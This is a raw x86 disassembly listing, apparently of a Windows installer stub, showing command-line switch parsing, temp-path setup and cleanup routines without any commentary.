  40328b:	ff 75 0c             	push   0xc(%ebp)
  40328e:	e8 cf 2b 00 00       	call   0x405e62
  403293:	85 c0                	test   %eax,%eax
  403295:	74 2f                	je     0x4032c6
  403297:	01 75 fc             	add    %esi,-0x4(%ebp)
  40329a:	eb 0e                	jmp    0x4032aa
  40329c:	a1 40 e6 41 00       	mov    0x41e640,%eax
  4032a1:	01 75 fc             	add    %esi,-0x4(%ebp)
  4032a4:	29 75 f8             	sub    %esi,-0x8(%ebp)
  4032a7:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4032aa:	83 7d ec 01          	cmpl   $0x1,-0x14(%ebp)
  4032ae:	0f 85 45 ff ff ff    	jne    0x4031f9
  4032b4:	eb 71                	jmp    0x403327
  4032b6:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  4032ba:	0f 8f 09 ff ff ff    	jg     0x4031c9
  4032c0:	eb 65                	jmp    0x403327
  4032c2:	6a fc                	push   $0xfffffffc
  4032c4:	eb 5b                	jmp    0x403321
  4032c6:	6a fe                	push   $0xfffffffe
  4032c8:	eb 57                	jmp    0x403321
  4032ca:	85 ff                	test   %edi,%edi
  4032cc:	75 3e                	jne    0x40330c
  4032ce:	39 7d 14             	cmp    %edi,0x14(%ebp)
  4032d1:	7e 54                	jle    0x403327
  4032d3:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  4032d6:	39 5d 14             	cmp    %ebx,0x14(%ebp)
  4032d9:	8b 75 14             	mov    0x14(%ebp),%esi
  4032dc:	7c 02                	jl     0x4032e0
  4032de:	8b f3                	mov    %ebx,%esi
  4032e0:	bf 00 82 42 00       	mov    $0x428200,%edi
  4032e5:	56                   	push   %esi
  4032e6:	57                   	push   %edi
  4032e7:	e8 45 00 00 00       	call   0x403331
  4032ec:	85 c0                	test   %eax,%eax
  4032ee:	74 2f                	je     0x40331f
  4032f0:	56                   	push   %esi
  4032f1:	57                   	push   %edi
  4032f2:	ff 75 0c             	push   0xc(%ebp)
  4032f5:	e8 68 2b 00 00       	call   0x405e62
  4032fa:	85 c0                	test   %eax,%eax
  4032fc:	74 c8                	je     0x4032c6
  4032fe:	01 75 fc             	add    %esi,-0x4(%ebp)
  403301:	29 75 14             	sub    %esi,0x14(%ebp)
  403304:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  403308:	7f cc                	jg     0x4032d6
  40330a:	eb 1b                	jmp    0x403327
  40330c:	39 75 14             	cmp    %esi,0x14(%ebp)
  40330f:	7d 03                	jge    0x403314
  403311:	8b 75 14             	mov    0x14(%ebp),%esi
  403314:	56                   	push   %esi
  403315:	57                   	push   %edi
  403316:	e8 16 00 00 00       	call   0x403331
  40331b:	85 c0                	test   %eax,%eax
  40331d:	75 05                	jne    0x403324
  40331f:	6a fd                	push   $0xfffffffd
  403321:	58                   	pop    %eax
  403322:	eb 06                	jmp    0x40332a
  403324:	89 75 fc             	mov    %esi,-0x4(%ebp)
  403327:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40332a:	5f                   	pop    %edi
  40332b:	5e                   	pop    %esi
  40332c:	5b                   	pop    %ebx
  40332d:	c9                   	leave
  40332e:	c2 10 00             	ret    $0x10
  403331:	ff 74 24 08          	push   0x8(%esp)
  403335:	ff 74 24 08          	push   0x8(%esp)
  403339:	ff 35 18 a0 40 00    	push   0x40a018
  40333f:	e8 ef 2a 00 00       	call   0x405e33
  403344:	c2 08 00             	ret    $0x8
  403347:	6a 00                	push   $0x0
  403349:	6a 00                	push   $0x0
  40334b:	ff 74 24 0c          	push   0xc(%esp)
  40334f:	ff 35 18 a0 40 00    	push   0x40a018
  403355:	ff 15 44 81 40 00    	call   *0x408144
  40335b:	c2 04 00             	ret    $0x4
  40335e:	56                   	push   %esi
  40335f:	be 00 f0 4d 00       	mov    $0x4df000,%esi
  403364:	56                   	push   %esi
  403365:	e8 e4 31 00 00       	call   0x40654e
  40336a:	56                   	push   %esi
  40336b:	e8 96 28 00 00       	call   0x405c06
  403370:	85 c0                	test   %eax,%eax
  403372:	75 02                	jne    0x403376
  403374:	5e                   	pop    %esi
  403375:	c3                   	ret
  403376:	56                   	push   %esi
  403377:	e8 13 28 00 00       	call   0x405b8f
  40337c:	56                   	push   %esi
  40337d:	e8 ec 24 00 00       	call   0x40586e
  403382:	56                   	push   %esi
  403383:	68 00 b0 4d 00       	push   $0x4db000
  403388:	e8 52 2a 00 00       	call   0x405ddf
  40338d:	5e                   	pop    %esi
  40338e:	c3                   	ret
  40338f:	81 ec d4 02 00 00    	sub    $0x2d4,%esp
  403395:	53                   	push   %ebx
  403396:	56                   	push   %esi
  403397:	57                   	push   %edi
  403398:	6a 20                	push   $0x20
  40339a:	5f                   	pop    %edi
  40339b:	33 db                	xor    %ebx,%ebx
  40339d:	68 01 80 00 00       	push   $0x8001
  4033a2:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  4033a6:	c7 44 24 10 e0 a2 40 	movl   $0x40a2e0,0x10(%esp)
  4033ad:	00 
  4033ae:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
  4033b2:	ff 15 a8 80 40 00    	call   *0x4080a8
  4033b8:	ff 15 a4 80 40 00    	call   *0x4080a4
  4033be:	25 ff ff ff bf       	and    $0xbfffffff,%eax
  4033c3:	66 3d 06 00          	cmp    $0x6,%ax
  4033c7:	a3 ec ae 47 00       	mov    %eax,0x47aeec
  4033cc:	74 11                	je     0x4033df
  4033ce:	53                   	push   %ebx
  4033cf:	e8 c0 32 00 00       	call   0x406694
  4033d4:	3b c3                	cmp    %ebx,%eax
  4033d6:	74 07                	je     0x4033df
  4033d8:	68 00 0c 00 00       	push   $0xc00
  4033dd:	ff d0                	call   *%eax
  4033df:	be b0 82 40 00       	mov    $0x4082b0,%esi
  4033e4:	56                   	push   %esi
  4033e5:	e8 3a 32 00 00       	call   0x406624
  4033ea:	56                   	push   %esi
  4033eb:	ff 15 50 81 40 00    	call   *0x408150
  4033f1:	8d 74 06 01          	lea    0x1(%esi,%eax,1),%esi
  4033f5:	80 3e 00             	cmpb   $0x0,(%esi)
  4033f8:	75 ea                	jne    0x4033e4
  4033fa:	6a 0a                	push   $0xa
  4033fc:	e8 93 32 00 00       	call   0x406694
  403401:	6a 08                	push   $0x8
  403403:	e8 8c 32 00 00       	call   0x406694
  403408:	6a 06                	push   $0x6
  40340a:	a3 e4 ae 47 00       	mov    %eax,0x47aee4
  40340f:	e8 80 32 00 00       	call   0x406694
  403414:	3b c3                	cmp    %ebx,%eax
  403416:	74 0f                	je     0x403427
  403418:	6a 1e                	push   $0x1e
  40341a:	ff d0                	call   *%eax
  40341c:	85 c0                	test   %eax,%eax
  40341e:	74 07                	je     0x403427
  403420:	80 0d ef ae 47 00 40 	orb    $0x40,0x47aeef
  403427:	55                   	push   %ebp
  403428:	ff 15 44 80 40 00    	call   *0x408044
  40342e:	53                   	push   %ebx
  40342f:	ff 15 a0 82 40 00    	call   *0x4082a0
  403435:	a3 b8 af 47 00       	mov    %eax,0x47afb8
  40343a:	53                   	push   %ebx
  40343b:	8d 44 24 34          	lea    0x34(%esp),%eax
  40343f:	68 b4 02 00 00       	push   $0x2b4
  403444:	50                   	push   %eax
  403445:	53                   	push   %ebx
  403446:	68 08 02 44 00       	push   $0x440208
  40344b:	ff 15 88 81 40 00    	call   *0x408188
  403451:	68 c8 a2 40 00       	push   $0x40a2c8
  403456:	68 e0 2e 47 00       	push   $0x472ee0
  40345b:	e8 5a 2e 00 00       	call   0x4062ba
  403460:	ff 15 a0 80 40 00    	call   *0x4080a0
  403466:	bd 00 b0 4c 00       	mov    $0x4cb000,%ebp
  40346b:	50                   	push   %eax
  40346c:	55                   	push   %ebp
  40346d:	e8 48 2e 00 00       	call   0x4062ba
  403472:	66 83 3d 00 b0 4c 00 	cmpw   $0x22,0x4cb000
  403479:	22 
  40347a:	c7 05 e0 ae 47 00 00 	movl   $0x400000,0x47aee0
  403481:	00 40 00 
  403484:	8b c5                	mov    %ebp,%eax
  403486:	75 08                	jne    0x403490
  403488:	6a 22                	push   $0x22
  40348a:	b8 02 b0 4c 00       	mov    $0x4cb002,%eax
  40348f:	5f                   	pop    %edi
  403490:	57                   	push   %edi
  403491:	50                   	push   %eax
  403492:	e8 25 27 00 00       	call   0x405bbc
  403497:	50                   	push   %eax
  403498:	ff 15 48 82 40 00    	call   *0x408248
  40349e:	8b c8                	mov    %eax,%ecx
  4034a0:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  4034a4:	66 8b 01             	mov    (%ecx),%ax
  4034a7:	66 3b c3             	cmp    %bx,%ax
  4034aa:	0f 84 11 01 00 00    	je     0x4035c1
  4034b0:	6a 20                	push   $0x20
  4034b2:	5b                   	pop    %ebx
  4034b3:	66 3b c3             	cmp    %bx,%ax
  4034b6:	75 07                	jne    0x4034bf
  4034b8:	41                   	inc    %ecx
  4034b9:	41                   	inc    %ecx
  4034ba:	66 39 19             	cmp    %bx,(%ecx)
  4034bd:	74 f9                	je     0x4034b8
  4034bf:	66 83 39 22          	cmpw   $0x22,(%ecx)
  4034c3:	75 05                	jne    0x4034ca
  4034c5:	41                   	inc    %ecx
  4034c6:	6a 22                	push   $0x22
  4034c8:	41                   	inc    %ecx
  4034c9:	5b                   	pop    %ebx
  4034ca:	66 83 39 2f          	cmpw   $0x2f,(%ecx)
  4034ce:	0f 85 b9 00 00 00    	jne    0x40358d
  4034d4:	41                   	inc    %ecx
  4034d5:	41                   	inc    %ecx
  4034d6:	66 83 39 53          	cmpw   $0x53,(%ecx)
  4034da:	75 19                	jne    0x4034f5
  4034dc:	66 8b 41 02          	mov    0x2(%ecx),%ax
  4034e0:	66 3d 20 00          	cmp    $0x20,%ax
  4034e4:	74 05                	je     0x4034eb
  4034e6:	66 85 c0             	test   %ax,%ax
  4034e9:	75 0a                	jne    0x4034f5
  4034eb:	c7 05 a0 af 47 00 01 	movl   $0x1,0x47afa0
  4034f2:	00 00 00 
  4034f5:	0f b7 05 c2 a2 40 00 	movzwl 0x40a2c2,%eax
  4034fc:	99                   	cltd
  4034fd:	0f a4 c2 10          	shld   $0x10,%eax,%edx
  403501:	c1 e0 10             	shl    $0x10,%eax
  403504:	8b f8                	mov    %eax,%edi
  403506:	33 f6                	xor    %esi,%esi
  403508:	0f b7 05 c0 a2 40 00 	movzwl 0x40a2c0,%eax
  40350f:	99                   	cltd
  403510:	0f b7 15 bc a2 40 00 	movzwl 0x40a2bc,%edx
  403517:	0b f8                	or     %eax,%edi
  403519:	0f b7 05 be a2 40 00 	movzwl 0x40a2be,%eax
  403520:	c1 e0 10             	shl    $0x10,%eax
  403523:	0b c2                	or     %edx,%eax
  403525:	99                   	cltd
  403526:	0b f0                	or     %eax,%esi
  403528:	8b 01                	mov    (%ecx),%eax
  40352a:	0b fa                	or     %edx,%edi
  40352c:	3b c6                	cmp    %esi,%eax
  40352e:	75 1b                	jne    0x40354b
  403530:	8b 41 04             	mov    0x4(%ecx),%eax
  403533:	3b c7                	cmp    %edi,%eax
  403535:	75 14                	jne    0x40354b
  403537:	66 8b 41 08          	mov    0x8(%ecx),%ax
  40353b:	66 3d 20 00          	cmp    $0x20,%ax
  40353f:	74 05                	je     0x403546
  403541:	66 85 c0             	test   %ax,%ax
  403544:	75 05                	jne    0x40354b
  403546:	83 4c 24 1c 04       	orl    $0x4,0x1c(%esp)
  40354b:	0f b7 05 b6 a2 40 00 	movzwl 0x40a2b6,%eax
  403552:	99                   	cltd
  403553:	0f a4 c2 10          	shld   $0x10,%eax,%edx
  403557:	c1 e0 10             	shl    $0x10,%eax
  40355a:	8b f8                	mov    %eax,%edi
  40355c:	33 f6                	xor    %esi,%esi
  40355e:	0f b7 05 b4 a2 40 00 	movzwl 0x40a2b4,%eax
  403565:	99                   	cltd
  403566:	0f b7 15 b0 a2 40 00 	movzwl 0x40a2b0,%edx
  40356d:	0b f8                	or     %eax,%edi
  40356f:	0f b7 05 b2 a2 40 00 	movzwl 0x40a2b2,%eax
  403576:	c1 e0 10             	shl    $0x10,%eax
  403579:	0b c2                	or     %edx,%eax
  40357b:	99                   	cltd
  40357c:	0b f0                	or     %eax,%esi
  40357e:	8b 41 fc             	mov    -0x4(%ecx),%eax
  403581:	0b fa                	or     %edx,%edi
  403583:	3b c6                	cmp    %esi,%eax
  403585:	75 06                	jne    0x40358d
  403587:	8b 01                	mov    (%ecx),%eax
  403589:	3b c7                	cmp    %edi,%eax
  40358b:	74 1f                	je     0x4035ac
  40358d:	53                   	push   %ebx
  40358e:	51                   	push   %ecx
  40358f:	e8 28 26 00 00       	call   0x405bbc
  403594:	8b c8                	mov    %eax,%ecx
  403596:	66 83 39 22          	cmpw   $0x22,(%ecx)
  40359a:	75 02                	jne    0x40359e
  40359c:	41                   	inc    %ecx
  40359d:	41                   	inc    %ecx
  40359e:	66 8b 01             	mov    (%ecx),%ax
  4035a1:	66 85 c0             	test   %ax,%ax
  4035a4:	0f 85 06 ff ff ff    	jne    0x4034b0
  4035aa:	eb 13                	jmp    0x4035bf
  4035ac:	66 83 61 fc 00       	andw   $0x0,-0x4(%ecx)
  4035b1:	83 c1 04             	add    $0x4,%ecx
  4035b4:	51                   	push   %ecx
  4035b5:	68 00 f0 4c 00       	push   $0x4cf000
  4035ba:	e8 fb 2c 00 00       	call   0x4062ba
  4035bf:	33 db                	xor    %ebx,%ebx
  4035c1:	8b 35 9c 80 40 00    	mov    0x40809c,%esi
  4035c7:	bf 00 f0 4d 00       	mov    $0x4df000,%edi
  4035cc:	57                   	push   %edi
  4035cd:	68 00 20 00 00       	push   $0x2000
  4035d2:	ff d6                	call   *%esi
  4035d4:	e8 85 fd ff ff       	call   0x40335e
  4035d9:	85 c0                	test   %eax,%eax
  4035db:	75 56                	jne    0x403633
  4035dd:	68 fb 1f 00 00       	push   $0x1ffb
  4035e2:	57                   	push   %edi
  4035e3:	ff 15 98 80 40 00    	call   *0x408098
  4035e9:	68 a4 a2 40 00       	push   $0x40a2a4
  4035ee:	57                   	push   %edi
  4035ef:	e8 e2 2c 00 00       	call   0x4062d6
  4035f4:	e8 65 fd ff ff       	call   0x40335e
  4035f9:	85 c0                	test   %eax,%eax
  4035fb:	75 36                	jne    0x403633
  4035fd:	57                   	push   %edi
  4035fe:	68 fc 1f 00 00       	push   $0x1ffc
  403603:	ff d6                	call   *%esi
  403605:	68 9c a2 40 00       	push   $0x40a29c
  40360a:	57                   	push   %edi
  40360b:	e8 c6 2c 00 00       	call   0x4062d6
  403610:	8b 35 70 80 40 00    	mov    0x408070,%esi
  403616:	57                   	push   %edi
  403617:	68 90 a2 40 00       	push   $0x40a290
  40361c:	ff d6                	call   *%esi
  40361e:	57                   	push   %edi
  40361f:	68 88 a2 40 00       	push   $0x40a288
  403624:	ff d6                	call   *%esi
  403626:	e8 33 fd ff ff       	call   0x40335e
  40362b:	85 c0                	test   %eax,%eax
  40362d:	0f 84 cb 00 00 00    	je     0x4036fe
  403633:	68 00 b0 4d 00       	push   $0x4db000
  403638:	ff 15 40 81 40 00    	call   *0x408140
  40363e:	ff 74 24 1c          	push   0x1c(%esp)
  403642:	e8 96 f8 ff ff       	call   0x402edd
  403647:	3b c3                	cmp    %ebx,%eax
  403649:	89 44 24 10          	mov    %eax,0x10(%esp)
  40364d:	0f 85 ab 00 00 00    	jne    0x4036fe
  403653:	39 1d 00 af 47 00    	cmp    %ebx,0x47af00
  403659:	0f 84 8f 00 00 00    	je     0x4036ee
  40365f:	53                   	push   %ebx
  403660:	55                   	push   %ebp
  403661:	e8 56 25 00 00       	call   0x405bbc
  403666:	8b f0                	mov    %eax,%esi
  403668:	3b f5                	cmp    %ebp,%esi
  40366a:	72 4c                	jb     0x4036b8
  40366c:	0f b7 05 82 a2 40 00 	movzwl 0x40a282,%eax
  403673:	99                   	cltd
  403674:	0f a4 c2 10          	shld   $0x10,%eax,%edx
  403678:	c1 e0 10             	shl    $0x10,%eax
  40367b:	8b d8                	mov    %eax,%ebx
  40367d:	0f b7 05 80 a2 40 00 	movzwl 0x40a280,%eax
  403684:	0f b7 0d 7c a2 40 00 	movzwl 0x40a27c,%ecx
  40368b:	99                   	cltd
  40368c:	0b d8                	or     %eax,%ebx
  40368e:	0f b7 05 7e a2 40 00 	movzwl 0x40a27e,%eax
  403695:	c1 e0 10             	shl    $0x10,%eax
  403698:	0b c1                	or     %ecx,%eax
  40369a:	33 c9                	xor    %ecx,%ecx
  40369c:	99                   	cltd
  40369d:	0b c8                	or     %eax,%ecx
  40369f:	8b c3                	mov    %ebx,%eax
  4036a1:	0b c2                	or     %edx,%eax
  4036a3:	8b 16                	mov    (%esi),%edx
  4036a5:	3b d1                	cmp    %ecx,%edx
  4036a7:	75 07                	jne    0x4036b0
  4036a9:	8b 56 04             	mov    0x4(%esi),%edx
  4036ac:	3b d0                	cmp    %eax,%edx
  4036ae:	74 06                	je     0x4036b6
  4036b0:	4e                   	dec    %esi
  4036b1:	4e                   	dec    %esi
  4036b2:	3b f5                	cmp    %ebp,%esi
  4036b4:	73 ed                	jae    0x4036a3
  4036b6:	33 db                	xor    %ebx,%ebx
  4036b8:	3b f5                	cmp    %ebp,%esi
  4036ba:	c7 44 24 10 e8 a1 40 	movl   $0x40a1e8,0x10(%esp)
  4036c1:	00 
  4036c2:	72 66                	jb     0x40372a
  4036c4:	66 89 1e             	mov    %bx,(%esi)
  4036c7:	83 c6 08             	add    $0x8,%esi
  4036ca:	56                   	push   %esi
  4036cb:	e8 c7 25 00 00       	call   0x405c97
  4036d0:	85 c0                	test   %eax,%eax
  4036d2:	74 2a                	je     0x4036fe
  4036d4:	56                   	push   %esi
  4036d5:	68 00 f0 4c 00       	push   $0x4cf000
  4036da:	e8 db 2b 00 00       	call   0x4062ba
  4036df:	56                   	push   %esi
  4036e0:	68 00 30 4d 00       	push   $0x4d3000
  4036e5:	e8 d0 2b 00 00       	call   0x4062ba
  4036ea:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  4036ee:	83 0d ac af 47 00 ff 	orl    $0xffffffff,0x47afac
  4036f5:	e8 b0 02 00 00       	call   0x4039aa
  4036fa:	89 44 24 14          	mov    %eax,0x14(%esp)
  4036fe:	e8 cd 01 00 00       	call   0x4038d0
  403703:	ff 15 9c 82 40 00    	call   *0x40829c
  403709:	39 5c 24 10          	cmp    %ebx,0x10(%esp)
  40370d:	5d                   	pop    %ebp
  40370e:	0f 84 20 01 00 00    	je     0x403834
  403714:	68 10 00 20 00       	push   $0x200010
  403719:	ff 74 24 10          	push   0x10(%esp)
  40371d:	e8 fe 21 00 00       	call   0x405920
  403722:	6a 02                	push   $0x2
  403724:	ff 15 b8 80 40 00    	call   *0x4080b8
  40372a:	e8 5c 21 00 00       	call   0x40588b
  40372f:	68 70 a2 40 00       	push   $0x40a270
  403734:	57                   	push   %edi
  403735:	8b f0                	mov    %eax,%esi
  403737:	e8 9a 2b 00 00       	call   0x4062d6
  40373c:	3b f3                	cmp    %ebx,%esi
  40373e:	74 0b                	je     0x40374b
  403740:	68 6c a2 40 00       	push   $0x40a26c
  403745:	57                   	push   %edi
  403746:	e8 8b 2b 00 00       	call   0x4062d6
  40374b:	68 60 a2 40 00       	push   $0x40a260
  403750:	57                   	push   %edi
  403751:	e8 80 2b 00 00       	call   0x4062d6
  403756:	bd 00 70 4d 00       	mov    $0x4d7000,%ebp
  40375b:	55                   	push   %ebp
  40375c:	57                   	push   %edi
  40375d:	ff 15 04 81 40 00    	call   *0x408104
  403763:	85 c0                	test   %eax,%eax
  403765:	74 97                	je     0x4036fe
  403767:	3b f3                	cmp    %ebx,%esi
  403769:	57                   	push   %edi
  40376a:	74 07                	je     0x403773
  40376c:	e8 80 20 00 00       	call   0x4057f1
  403771:	eb 05                	jmp    0x403778
  403773:	e8 f6 20 00 00       	call   0x40586e
  403778:	57                   	push   %edi
  403779:	ff 15 90 80 40 00    	call   *0x408090
  40377f:	66 39 1d 00 f0 4c 00 	cmp    %bx,0x4cf000
  403786:	75 0b                	jne    0x403793
  403788:	55                   	push   %ebp
  403789:	68 00 f0 4c 00       	push   $0x4cf000
  40378e:	e8 27 2b 00 00       	call   0x4062ba
  403793:	ff 74 24 18          	push   0x18(%esp)
  403797:	68 00 b0 47 00       	push   $0x47b000
  40379c:	e8 19 2b 00 00       	call   0x4062ba
  4037a1:	0f b7 05 5a a2 40 00 	movzwl 0x40a25a,%eax
  4037a8:	0f b7 0d 58 a2 40 00 	movzwl 0x40a258,%ecx
  4037af:	c1 e0 10             	shl    $0x10,%eax
  4037b2:	0b c1                	or     %ecx,%eax
  4037b4:	6a 1a                	push   $0x1a
  4037b6:	a3 00 f0 47 00       	mov    %eax,0x47f000
  4037bb:	5d                   	pop    %ebp
  4037bc:	be 08 c2 43 00       	mov    $0x43c208,%esi
  4037c1:	a1 f4 ae 47 00       	mov    0x47aef4,%eax
  4037c6:	ff b0 20 01 00 00    	push   0x120(%eax)
  4037cc:	56                   	push   %esi
  4037cd:	e8 0a 2b 00 00       	call   0x4062dc
  4037d2:	56                   	push   %esi
  4037d3:	ff 15 40 81 40 00    	call   *0x408140
  4037d9:	39 5c 24 10          	cmp    %ebx,0x10(%esp)
  4037dd:	74 3f                	je     0x40381e
  4037df:	6a 01                	push   $0x1
  4037e1:	56                   	push   %esi
  4037e2:	68 00 70 4e 00       	push   $0x4e7000
  4037e7:	ff 15 8c 80 40 00    	call   *0x40808c
  4037ed:	85 c0                	test   %eax,%eax
  4037ef:	74 2d                	je     0x40381e
  4037f1:	53                   	push   %ebx
  4037f2:	56                   	push   %esi
  4037f3:	e8 88 28 00 00       	call   0x406080
  4037f8:	a1 f4 ae 47 00       	mov    0x47aef4,%eax
  4037fd:	ff b0 24 01 00 00    	push   0x124(%eax)
  403803:	56                   	push   %esi
  403804:	e8 d3 2a 00 00       	call   0x4062dc
  403809:	56                   	push   %esi
  40380a:	e8 94 20 00 00       	call   0x4058a3
  40380f:	3b c3                	cmp    %ebx,%eax
  403811:	74 0b                	je     0x40381e
  403813:	50                   	push   %eax
  403814:	ff 15 20 81 40 00    	call   *0x408120
  40381a:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  40381e:	66 ff 05 00 f0 47 00 	incw   0x47f000
  403825:	4d                   	dec    %ebp
  403826:	75 99                	jne    0x4037c1
  403828:	53                   	push   %ebx
  403829:	57                   	push   %edi
  40382a:	e8 51 28 00 00       	call   0x406080
  40382f:	e9 ca fe ff ff       	jmp    0x4036fe
  403834:	39 1d 94 af 47 00    	cmp    %ebx,0x47af94
  40383a:	74 7c                	je     0x4038b8
  40383c:	8d 44 24 14          	lea    0x14(%esp),%eax
  403840:	50                   	push   %eax
  403841:	6a 28                	push   $0x28
  403843:	ff 15 88 80 40 00    	call   *0x408088
  403849:	50                   	push   %eax
  40384a:	ff 15 10 80 40 00    	call   *0x408010
  403850:	85 c0                	test   %eax,%eax
  403852:	74 34                	je     0x403888
  403854:	8d 44 24 20          	lea    0x20(%esp),%eax
  403858:	50                   	push   %eax
  403859:	68 30 a2 40 00       	push   $0x40a230
  40385e:	53                   	push   %ebx
  40385f:	ff 15 14 80 40 00    	call   *0x408014
  403865:	53                   	push   %ebx
  403866:	53                   	push   %ebx
  403867:	8d 44 24 24          	lea    0x24(%esp),%eax
  40386b:	53                   	push   %ebx
  40386c:	50                   	push   %eax
  40386d:	53                   	push   %ebx
  40386e:	ff 74 24 28          	push   0x28(%esp)
  403872:	c7 44 24 34 01 00 00 	movl   $0x1,0x34(%esp)
  403879:	00 
  40387a:	c7 44 24 40 02 00 00 	movl   $0x2,0x40(%esp)
  403881:	00 
  403882:	ff 15 00 80 40 00    	call   *0x408000
  403888:	6a 04                	push   $0x4
  40388a:	e8 05 2e 00 00       	call   0x406694
  40388f:	3b c3                	cmp    %ebx,%eax
  403891:	be 02 00 04 80       	mov    $0x80040002,%esi
  403896:	74 0c                	je     0x4038a4
  403898:	56                   	push   %esi
  403899:	6a 25                	push   $0x25
  40389b:	53                   	push   %ebx
  40389c:	53                   	push   %ebx
  40389d:	53                   	push   %ebx
  40389e:	ff d0                	call   *%eax
  4038a0:	85 c0                	test   %eax,%eax
  4038a2:	74 0d                	je     0x4038b1
  4038a4:	56                   	push   %esi
  4038a5:	6a 02                	push   $0x2
  4038a7:	ff 15 4c 82 40 00    	call   *0x40824c
  4038ad:	85 c0                	test   %eax,%eax
  4038af:	75 07                	jne    0x4038b8
  4038b1:	6a 09                	push   $0x9
  4038b3:	e8 53 db ff ff       	call   0x40140b
  4038b8:	a1 ac af 47 00       	mov    0x47afac,%eax
  4038bd:	83 f8 ff             	cmp    $0xffffffff,%eax
  4038c0:	74 04                	je     0x4038c6
  4038c2:	89 44 24 10          	mov    %eax,0x10(%esp)
  4038c6:	ff 74 24 10          	push   0x10(%esp)
  4038ca:	ff 15 b8 80 40 00    	call   *0x4080b8
  4038d0:	a1 18 a0 40 00       	mov    0x40a018,%eax
  4038d5:	83 f8 ff             	cmp    $0xffffffff,%eax
  4038d8:	74 0e                	je     0x4038e8
  4038da:	50                   	push   %eax
  4038db:	ff 15 20 81 40 00    	call   *0x408120
  4038e1:	83 0d 18 a0 40 00 ff 	orl    $0xffffffff,0x40a018
  4038e8:	e8 28 00 00 00       	call   0x403915
  4038ed:	6a 07                	push   $0x7
  4038ef:	68 00 30 4e 00       	push   $0x4e3000
  4038f4:	e8 d3 20 00 00       	call   0x4059cc
  4038f9:	c3                   	ret
  4038fa:	56                   	push   %esi
  4038fb:	8b 35 0c 02 44 00    	mov    0x44020c,%esi
  403901:	eb 0a                	jmp    0x40390d
  403903:	ff 74 24 08          	push   0x8(%esp)
  403907:	ff 56 04             	call   *0x4(%esi)
  40390a:	8b 36                	mov    (%esi),%esi
  40390c:	59                   	pop    %ecx
  40390d:	85 f6                	test   %esi,%esi
  40390f:	75 f2                	jne    0x403903
  403911:	5e                   	pop    %esi
  403912:	c2 04 00             	ret    $0x4
  403915:	56                   	push   %esi
  403916:	8b 35 0c 02 44 00    	mov    0x44020c,%esi
  40391c:	6a 00                	push   $0x0
  40391e:	e8 d7 ff ff ff       	call   0x4038fa
  403923:	85 f6                	test   %esi,%esi
  403925:	74 1a                	je     0x403941
  403927:	57                   	push   %edi
  403928:	8b fe                	mov    %esi,%edi
  40392a:	8b 36                	mov    (%esi),%esi
  40392c:	ff 77 08             	push   0x8(%edi)
  40392f:	ff 15 68 81 40 00    	call   *0x408168
  403935:	57                   	push   %edi
  403936:	ff 15 28 81 40 00    	call   *0x408128
  40393c:	85 f6                	test   %esi,%esi
  40393e:	75 e8                	jne    0x403928
  403940:	5f                   	pop    %edi
  403941:	83 25 0c 02 44 00 00 	andl   $0x0,0x44020c
  403948:	5e                   	pop    %esi
  403949:	c3                   	ret
  40394a:	a1 0c 02 44 00       	mov    0x44020c,%eax
  40394f:	eb 0b                	jmp    0x40395c
  403951:	8b 48 08             	mov    0x8(%eax),%ecx
  403954:	3b 4c 24 04          	cmp    0x4(%esp),%ecx
  403958:	74 0a                	je     0x403964
  40395a:	8b 00                	mov    (%eax),%eax
  40395c:	85 c0                	test   %eax,%eax
  40395e:	75 f1                	jne    0x403951
  403960:	40                   	inc    %eax
  403961:	c2 04 00             	ret    $0x4
  403964:	33 c0                	xor    %eax,%eax
  403966:	eb f9                	jmp    0x403961
  403968:	56                   	push   %esi
  403969:	8b 74 24 08          	mov    0x8(%esp),%esi
  40396d:	56                   	push   %esi
  40396e:	e8 d7 ff ff ff       	call   0x40394a
  403973:	85 c0                	test   %eax,%eax
  403975:	75 03                	jne    0x40397a
  403977:	40                   	inc    %eax
  403978:	eb 2c                	jmp    0x4039a6
  40397a:	6a 0c                	push   $0xc
  40397c:	6a 40                	push   $0x40
  40397e:	ff 15 34 81 40 00    	call   *0x408134
  403984:	85 c0                	test   %eax,%eax
  403986:	74 1b                	je     0x4039a3
  403988:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  40398c:	89 70 08             	mov    %esi,0x8(%eax)
  40398f:	89 48 04             	mov    %ecx,0x4(%eax)
  403992:	8b 0d 0c 02 44 00    	mov    0x44020c,%ecx
  403998:	89 08                	mov    %ecx,(%eax)
  40399a:	a3 0c 02 44 00       	mov    %eax,0x44020c
  40399f:	33 c0                	xor    %eax,%eax
  4039a1:	eb 03                	jmp    0x4039a6
  4039a3:	83 c8 ff             	or     $0xffffffff,%eax
  4039a6:	5e                   	pop    %esi
  4039a7:	c2 08 00             	ret    $0x8
  4039aa:	83 ec 10             	sub    $0x10,%esp
  4039ad:	53                   	push   %ebx
  4039ae:	55                   	push   %ebp
  4039af:	56                   	push   %esi
  4039b0:	8b 35 f4 ae 47 00    	mov    0x47aef4,%esi
  4039b6:	57                   	push   %edi
  4039b7:	6a 02                	push   $0x2
  4039b9:	e8 d6 2c 00 00       	call   0x406694
  4039be:	33 ff                	xor    %edi,%edi
  4039c0:	3b c7                	cmp    %edi,%eax
  4039c2:	74 12                	je     0x4039d6
  4039c4:	ff d0                	call   *%eax
  4039c6:	0f b7 c0             	movzwl %ax,%eax
  4039c9:	50                   	push   %eax
  4039ca:	68 00 b0 4d 00       	push   $0x4db000
  4039cf:	e8 2d 28 00 00       	call   0x406201
  4039d4:	eb 5a                	jmp    0x403a30
  4039d6:	bb 48 02 45 00       	mov    $0x450248,%ebx
  4039db:	57                   	push   %edi
  4039dc:	53                   	push   %ebx
  4039dd:	57                   	push   %edi
  4039de:	68 98 83 40 00       	push   $0x408398
  4039e3:	68 01 00 00 80       	push   $0x80000001
  4039e8:	66 c7 05 00 b0 4d 00 	movw   $0x30,0x4db000
  4039ef:	30 00 
  4039f1:	66 c7 05 02 b0 4d 00 	movw   $0x78,0x4db002
  4039f8:	78 00 
  4039fa:	66 89 3d 04 b0 4d 00 	mov    %di,0x4db004
